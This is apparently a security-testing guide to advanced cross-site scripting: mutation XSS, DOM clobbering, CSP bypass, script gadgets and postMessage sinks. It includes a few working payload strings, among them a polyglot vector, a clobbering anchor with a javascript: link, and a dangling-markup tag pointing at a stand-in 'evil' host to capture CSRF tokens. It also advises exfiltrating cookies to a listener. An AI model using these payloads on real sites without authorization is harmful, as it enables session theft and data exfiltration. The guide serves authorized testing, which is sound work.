# Advanced XSS — Deep Dive

When `<script>alert(1)</script>` is filtered and a CSP is in place, XSS becomes about the parser's
edge cases and the page's own scripts. This covers mutation XSS, DOM clobbering, CSP bypass, and
script gadgets — the techniques that get execution when the obvious payloads don't. Authorized
testing; prove impact in a victim context you own.

## Context is everything

The same bytes are inert or executable depending on where they land. Identify the exact sink:

- **HTML body** → introduce a new element/handler.
- **Attribute** → break out (`"`, `'`) or use an event handler if you can't.
- **JS string** → break the quote / `</script>`; mind ASI and template literals.
- **URL/attribute value** → `javascript:` scheme, `srcdoc`.

A **polyglot** payload is built to fire in several contexts at once — useful when you can't see the
reflection context, e.g. `jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//` style vectors
(the point is one string surviving HTML, attribute, and JS contexts).

## Mutation XSS (mXSS)

The browser's HTML parser **rewrites** the DOM after a sanitizer ran, re-introducing markup the
sanitizer thought it removed. Classic vectors:

- **`innerHTML` round-tripping:** sanitized string is safe as text, but when assigned to
  `innerHTML` the parser mutates it (e.g. inside `<template>`, `<noscript>`, `<svg>`/`<math>`
  foreign-content boundaries, or with malformed entities/attributes) into an executing form.
- **Namespace confusion:** `<svg>` / `<math>` switch HTML integration points where the same tag
  parses differently — DOMPurify and others have had mXSS bypasses here across versions.
- The fix is sanitize-after-parse and a maintained sanitizer; an outdated DOMPurify is worth
  checking against known mXSS PoCs for its version.

## DOM clobbering

No script needed to *start*: HTML `id`/`name` attributes create named properties on `document` and
on parent elements. If code does `if (window.CONFIG) use(window.CONFIG.url)`, injecting
`<a id=CONFIG><a id=CONFIG name=url href="javascript:...">` clobbers `CONFIG.url`. Turns an HTML
injection (where script is blocked) into control over a variable the page's own script trusts —
often chained into a script gadget for execution.

## CSP bypass

Read the CSP first (`tools/csp_analyze.py`); it dictates what works:

- **`unsafe-inline` without nonce/strict-dynamic** → inline handlers/scripts just run.
- **Allowlisted host with a gadget:** an allowed CDN that serves a callable JSONP endpoint, or an
  outdated framework (AngularJS `ng-app` sandbox escapes, older Vue) hosted there → "script
  gadget" execution within policy.
- **`strict-dynamic`** trusts scripts loaded by already-trusted scripts — find an injection into a
  trusted script's `src`/loader, or a DOM-clobbering gadget it consumes.
- **`base-uri` missing** → inject `<base href>` to hijack relative script `src`.
- **Dangling markup / no `script`** exfiltration: when you can't execute, an unterminated
  attribute (`<img src='https://evil/?` ) captures subsequent markup (including CSRF tokens) up to
  the next quote — data theft without script, if `img-src`/`connect-src` allow it.
- **`nonce` reuse / predictable nonce**, or nonce reflected into the page from user input.

## Script gadgets

Modern apps ship libraries that turn benign-looking DOM into behavior: a framework that reads
`data-*` attributes and does something dangerous, a client-side template that evaluates
expressions, a JSON-driven renderer. HTML injection (allowed) + a gadget (present) = execution
(even under CSP). Inventory the loaded libraries and their known gadgets.

## postMessage → DOM XSS

A handler that doesn't check `event.origin` and writes `event.data` into a sink is XSS from any
frame/opener. Read every `addEventListener('message', …)` in the bundle; trace `data` to a sink.

## From execution to impact

`alert(1)` proves nothing to a triager. Show the payload doing something: steal the session
token/cookie (if not HttpOnly), perform a state-changing action as the victim, or exfiltrate data
to your listener. For stored XSS, show it firing for a *different* user.

## Method

Map the sink and context, pick the technique the CSP/sanitizer leaves open, confirm execution in a
real browser, then demonstrate concrete impact against your own victim account.
